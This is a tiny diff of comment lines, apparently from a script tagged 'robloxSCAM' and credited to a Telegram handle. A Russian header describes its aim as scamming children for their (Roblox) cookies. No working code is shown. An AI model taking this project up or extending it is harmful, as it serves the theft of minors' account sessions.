@@ -1,5 +1,5 @@
 # made by 
-#t.me/aiogrammader
+# t.me/aiogrammader
 # robloxSCAM
 бля ну и нахуя
 # ЧТО НУЖНО ДЛЯ ТОГО ЧТОБЫ СКАМИТЬ ДЕТЕЙ НА КУКИ
